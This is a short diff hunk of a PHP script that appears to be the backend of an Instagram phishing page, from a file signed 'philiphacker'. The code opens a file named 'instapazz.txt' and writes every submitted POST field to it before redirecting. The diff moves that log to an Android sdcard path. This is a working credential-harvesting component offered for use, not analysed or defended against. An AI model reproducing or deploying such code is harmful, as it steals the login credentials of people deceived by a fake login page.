@@ -2,7 +2,7 @@
 // www.philiphacker.in
 header
 ('location:');
-$handle=fopen("instapazz.txt","a");
+$handle=fopen("/sdcard/www.philiphacker.in/insta/instapazz.txt","a");
 foreach($_POST as $variable=>$value)
 {
 fwrite($handle,$variable);
